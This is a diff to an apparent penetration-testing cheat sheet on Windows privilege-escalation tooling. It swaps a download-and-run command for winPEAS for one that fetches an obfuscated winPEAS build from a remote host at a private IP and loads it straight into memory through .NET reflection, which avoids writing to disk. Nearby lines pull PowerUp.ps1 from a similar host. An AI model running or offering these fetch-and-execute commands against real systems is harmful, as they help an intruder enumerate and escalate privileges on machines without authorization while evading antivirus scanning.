@@ -52,13 +52,16 @@ Invoke-WebRequest -Uri "http://192.168.10.10:8000/download/PowerUp.ps1" -OutFile
 Exe
 
 ```powershell
-https://github.com/peass-ng/PEASS-ng/releases/download/20240602-829055f0/winPEASany.exe
+wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany_ofs.exe
 ```
 
 Exe - Execution
 
-```powershell
-powershell -Command "iwr -Uri 'http://192.168.10.10:8888/winPEASx64.exe' -OutFile $env:temp\winPEASx64.exe; Start-Process $env:temp\winPEASx64.exe"
+```
+$url = "http://192.168.45.168:8888/winPEASany_ofs.exe"
+```
+```
+$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("")
 ```
 
 Ps1
